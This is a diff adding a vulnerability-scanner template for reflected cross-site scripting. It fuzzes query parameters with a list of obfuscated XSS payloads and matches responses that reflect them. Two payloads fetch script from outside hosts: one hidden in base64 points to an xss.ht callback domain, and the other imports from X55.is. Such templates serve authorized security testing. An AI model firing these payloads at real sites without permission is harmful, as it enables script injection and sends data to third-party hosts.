@@ -1,0 +1,55 @@
+id: reflected-xss3
+
+info:
+  name: Reflected Cross Site Scripting
+  author: github.com/freelancermijan
+  severity: medium
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "\\74k<K/contentEditable/autoFocus/OnFocus="
+        - "/*${/*/;{/**/(alert)(1)}//><Base/Href=//google.com\\76-->"
+        - "<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//"
+        - "javascript:%ef%bb%bfalert(XSS)"
+        - '"><video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>'
+        - '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>'
+        - '<img/src=x onError="`${x}`;alert(`Hello`);">'
+        - '"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>'
+        - "&#34;&gt;&lt;track/onerror=&#x27;confirm\\%601\\%60&#x27;&gt;"
+        - "<svg/onload=location=‘javas’%2B‘cript:’%2B"
+        - "‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)"
+        - "<svg/onload=location=/javas/.source%2B/cript:/.source%2B"
+        - "/ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)"
+        - "<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>"
+        - "';k='e'%0Atop['al'+k+'rt'](1)//"
+        - "<Img Src=//X55.is OnLoad%0C=import(Src)>"
+        - "<img/src/onerror=alert/1337/(1)>"
+        - "<img/src/onerror=alert//&NewLine;(2)>"
+        - "<img/src/onerror=alert&sol;&sol;(3)>"
+        - '"/><script%20>alert(document.domain)<%2fscript>.css'
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
